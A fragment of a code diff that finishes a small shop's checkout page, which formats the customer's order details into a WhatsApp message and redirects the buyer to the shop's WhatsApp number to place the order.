+        `📞 *Phone:* ${encodeURIComponent(customerMobile)}%0A` +
+        `📍 *Address:* ${encodeURIComponent(customerAddress)}%0A` +
+        `🏙 *City:* ${encodeURIComponent(customerCity)}%0A` +
+        `📮 *Pincode:* ${encodeURIComponent(customerPincode)}%0A%0A` +
+        `🛍 *Product:* ${encodeURIComponent(product.name)}%0A` +
+        `💰 *Price:* ${encodeURIComponent(formatPrice(product.price))}%0A` +
+        `💳 *Payment:* ${encodeURIComponent(paymentMethod)}%0A%0A` +
+        `_via Akaruo checkout_`;
+
+      // WhatsApp number: 919608891170
+      const waNumber = '919608891170';
+      const waUrl = `https://wa.me/${waNumber}?text=${message}`;
+
+      // Redirect to WhatsApp
+      window.location.href = waUrl;
+    };
+
+    // also allow Enter key to place order? optional
+    const inputs = [fullName, mobile, address, city, pincode];
+    inputs.forEach(input => {
+      if (input) {
+        input.addEventListener('keypress', (e) => {
+          if (e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('placeOrderBtn')?.click();
+          }
+        });
+      }
+    });
+
+    // Attach radio selection effect
+    console.log('✨ Akaruo checkout ready — Flipkart style.');
+  })();
+</script>
+<!-- subtle note: product can be passed like checkout.html?name=Midnight+Oak&price=2499 -->
+</body>
+              </html>
